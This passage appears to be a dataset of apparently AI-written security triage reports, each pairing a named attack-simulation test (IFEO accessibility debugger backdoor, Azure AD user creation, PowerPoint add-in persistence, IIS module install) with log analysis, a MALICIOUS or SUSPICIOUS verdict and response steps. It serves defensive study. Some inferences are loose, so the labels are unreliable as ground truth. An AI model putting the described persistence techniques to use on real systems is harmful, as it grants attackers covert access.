#### Sysmon Logs:
1. **Powershell Activity**: A PowerShell event is noteworthy. It attempts to edit registry paths under `Image File Execution Options` with the aim of invoking `cmd.exe` as a debugger for various accessibility tools (“osk.exe, sethc.exe, etc.”). This behavior is indicative of a persistence mechanism often used in malicious activity to gain backdoor access, especially when exploiting assistive technologies.

2. **Process Executions**: Sysmon logs show several processes, such as `wevtutil.exe`, `hostname.exe`, and `whoami.exe`, executing under the `admin_test` user. These activities, possibly for reconnaissance, combined with the parentage from `wsmprovhost.exe`, suggest remote management or scripting sessions.

3. **Suspicious Command Lines**: The PowerShell commands seen in the Sysmon and Windows PowerShell logs suggest an intent to create persistent backdoors—the setting of debugger properties to spawn `cmd.exe`.

#### Windows PowerShell Logs:
- Reflect that a PowerShell script was executed, which corresponds to the suspicious Sysmon activity. The precise involvement of PowerShell in registry modification affirms the need for further inquiry.

### Assessment:

The logs indicate potentially malicious behavior:
- **Suspicious PowerShell Commands**: These commands are commonly associated with persistence mechanisms for unauthorized access. 
- **Registry Modifications**: Specifically targeting assistive technologies, changes here are consistent with known attack vectors for maintaining persistence on compromised systems.
  
### Resolution:
- **MALICIOUS**: The observed behavior is consistent with known malicious techniques for gaining and maintaining unauthorized access to systems, warranting immediate action.

### Guidance on How to Proceed:
1. **Immediate Isolation**: Disconnect the host from the network to prevent any potential spread or external communication.
2. **Detailed Inspection**: Conduct a deeper forensic analysis on this host to understand the full scope.
3. **Scan and Clean**: Execute a comprehensive endpoint security scan and remove any indicators of compromise.
4. **Review and Harden**: Verify the security configurations, especially involving PowerShell usage and registry access. Consider hardening techniques like enforcing execution policies and disabling unnecessary services.
5. **User Education**: Reiterate secure practices and awareness for users to recognize and report suspicious activities.

By confirming the presence of malicious activity, these steps will help in eradicating the threat and strengthening future defenses."
Azure AD - Create a new user,"Upon reviewing the provided logs, several points of suspicious or anomalous behavior were identified:

1. **Suspicious PowerShell Activity**: 
   - The execution of PowerShell with specific commands (e.g., `New-AzureADUser`, `Connect-AzureAD`) with a script to create a new Azure AD user using a predefined credential set is a red flag. This activity typically indicates a potential attempt to manipulate cloud resources or accounts, often related to attacks or unauthorized actions in cloud environments.
   - The command involves the use of a potentially sensitive password, which could indicate a script-based attack or automation for unauthorized account creation.

2. **Elevated Privilege Events**:
   - Several `4624` (An account successfully logged on) and `4672` (Special privileges assigned to new logon) Security events indicate SYSTEM-level actions, possibly legitimate but warrant checking for context since SYSTEM-level activities with special privileges are risky if not expected during that timeframe.

3. **Command Line Tools and Processes**:
   - Execution of command-line tools like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` by ""admin_test"" appears within the context of a high integrity level. While these are common administrative actions, without context, repeated uses close together could suggest reconnaissance or scripted tasks.

4. **Repeated Attempts on Credentials**:
   - Repeated events with `EventID 5379` indicate failed attempts to acquire credentials from `MicrosoftAccount:user=02txoixylodcstop` and similar targets, which indicates likely misuse or scanning for valid credentials.

5. **Process Creation via High-Integrity Levels**:
   - Most Sysmon logs show high system-level integrity actions and operations, particularly involving tools such as WMI (WmiPrvSE.exe) and system services, which could potentially point to scripted activity or malicious actors trying to maintain persistence.

**Conclusion:**

Based on the several points of evidence of potentially unauthorized activity, including the PowerShell script use and systematic attempts to spawn processes and access potentially sensitive information, this can amount to potentially malicious activity.

**Resolution**: 
- **SUSPICIOUS**. This activity needs further investigation, specifically to determine if it aligns with scheduled administrative tasks or indicators of compromise, and validate whether the account activities were authorized. Logs should be cross-referenced with network and endpoint monitoring tools to establish a full picture, and engage incident response if required to mitigate potential unauthorized access or data manipulation. Additional monitoring and network restrictions can be considered until resolutions and assurances of non-malicious activity are confirmed."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"Based on the provided log entries, I'll go through the analysis step by step:

### Application and Sysmon Log Analysis:
1. **Microsoft Edge Updates**: There are multiple entries related to Microsoft Edge Update processes. This includes starting and stopping services, and running updates. The command line arguments, file paths, and execution context suggest these activities are related to the legitimate updating of the Microsoft Edge browser. A service stop and start in a short period can be normal in update operations.

2. **PowerShell Activity**: 
   - There is a PowerShell script executed that involves copying a file (`PptVBAaddin.ppam`) to a location in the user's AppData directory and making registry modifications.
   - The script aims to interact with `PowerPoint.Application`, runs several registry commands, and attempts to stop and start PowerPoint.
   - This could be suspicious activity due to its nature of manipulating registry entries and running from a temporary directory. However, without context, it might be part of legitimate software installation or configuration.

3. **Conhost and PowerShell executions**:
   - Conhost.exe processes are frequently seen accompanying command-line applications like PowerShell. In this context, they are related to, or spawn from, legit applications like whoami.exe and PowerShell.
   - `whoami.exe` and `hostname.exe` executions are benign on their own and can be used for system checks.

4. **Error in PowerShell Script**:
   - The PowerShell logs show an error where the script failed to copy the `PptVBAaddin.ppam` file due to a path error. This further could hint at a script attempting unauthorized operations without necessary file paths existing, which is tendency towards suspicious.

### Assessment:
- **Edge Update**: Activities related to the Microsoft Edge Update service are common and expected as part of regular browser update maintenance.
- **PowerShell Script**: The PowerShell script is attempting to set up an add-in, create registry entries, and interact with PowerPoint. This sequence can be suspicious as it involves modifying user configurations and automating interactions with Office applications which is a frequent technique used in macro-based malware or malicious scripts.
  
### Overall Resolution:
Given the combination of the failed PowerShell script operating out of a temporary directory and making registry alterations, along with the benign nature of other logs related to system processes and Microsoft Edge updates, the log records suggest **SUSPICIOUS** activity.
  
### Guidance on how to proceed:
1. **Further Investigation**: Review the origin of the PowerShell script executed. Determine if it is an expected script from an IT maintenance task or user-installed application. Look for similar past activities to rule out false positives.
2. **Isolate Files**: Gather more details on `PptVBAaddin.ppam` and any files in the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory for analysis.
3. **Monitor Activity**: Increase monitoring of PowerShell activities and registry changes on `Server002`.
4. **User Contact**: Contact the user `admin_test` to verify if they initiated any such operations or if any applications are expected to perform these actions.

Conclusively, while there is no definitive evidence of malicious intent, the behavior warrants closer inspection to rule out potential unnoticed compromise."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"### Analysis of Logs

#### Windows PowerShell Logs
The PowerShell activity revolves around a specific command executed by `powershell.exe`:
```plaintext
New-WebGlobalModule -Name DefaultDocumentModule_file -Image %windir%\system32\inetsrv\defdoc.dll
```
- **Suspicious Indicator**: The command involves the modification or creation of a web module which can be used to inject malicious code into web servers. This can be especially concerning if 'DefaultDocumentModule_file' is not a known legitimate module on your IIS installation.

#### Application Logs
- **Entries**:
  - Software Protection Platform Service and Edge updates look routine, except for two consecutive service stops from `edgeupdate`.
  - **Assessment**: Regular updates and maintenance actions related to Microsoft Edge. No immediate malicious indicators.

#### Sysmon Logs
- **PowerShell Execution**: 
  - `powershell.exe` was executed by `SERVER002\admin_test`. The creation of new processes such as `whoami.exe` and `hostname.exe` immediately follows the PowerShell activity. These activities, like verifying user identities or system names, could be an attempt to ascertain server information post-compromise.
  
- **Usage of `wevtutil.exe`**:
  - Multiple instances of `wevtutil.exe` are run by `SERVER002\admin_test`. This tool is often used to query, backup, and manage event logs, and its use here is somewhat anomalous unless conducted for legitimate maintenance.
 
#### Indicators and Risks
- **Command Execution**: The PowerShell command to install or update a web module could be a sign of compromise, especially if such an action was not expected or scheduled.
- **Interest in System Identity**: Execution of `whoami.exe` and `hostname.exe` suggests a check on user permissions or system admin rights, which might indicate lateral movement preparation.
- **`wevtutil.exe` Usage**: Use of wevtutil might indicate log clearing attempts – a common post-exploitation activity.

### Conclusion
The logs demonstrated a mix of somewhat anomalous and potentially suspicious activities, particularly related to the execution of certain PowerShell commands and the use of administrative tools. Given the presence of these indicators, the overall activity cannot be confidently deemed benign.

### Resolution
**SUSPICIOUS**

### Guidance
- **Immediate Actions**:
  - Conduct a deeper investigation into the server's present configuration, especially the web server modules.
  - Verify the legitimacy of the command executed through PowerShell with the corresponding team.
  - Audit the user `SERVER002\admin_test` for any unauthorized access or permissions recently altered.
  - Check for any scheduled tasks or roles of users that would validate the use of `wevtutil.exe`.

- **Long-term Measures**:
  - Enhance monitoring around PowerShell activities by enabling script block logging and transcription for all uses of PowerShell.
  - Investigate any network traffic anomalies, unusual access to shared files, or other system interactions around the time these logs were recorded."
